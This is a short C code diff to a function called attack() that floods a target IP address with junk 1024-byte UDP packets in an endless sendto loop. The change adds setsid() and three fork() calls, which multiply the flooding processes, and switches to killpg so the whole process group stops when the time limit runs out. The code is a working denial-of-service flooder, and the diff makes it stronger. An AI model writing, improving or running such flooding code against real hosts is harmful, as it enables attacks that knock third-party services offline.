@@ -21,6 +21,8 @@ int attack(char *target, unsigned int t){
 	}
 
 	if(child == 0){ // child
+		if(-1 == setsid())
+			exit(-1);
 		int sockfd;
 		struct sockaddr_in servaddr;
 
@@ -36,13 +38,16 @@ int attack(char *target, unsigned int t){
 		servaddr.sin_addr.s_addr = inet_addr(target);
 
 		int ret;
+		fork();
+		fork();
+		fork();
 		for(;;){
 			ret = sendto(sockfd, garbage, 1024, MSG_DONTWAIT, (struct sockaddr*)&servaddr, sizeof(servaddr));
 		}
 		exit(0);
 	}
 	sleep(t);
-	kill(child,SIGKILL);
+	killpg(child,SIGKILL);
 	waitpid(child, &status, 0);
 
 	return 0;
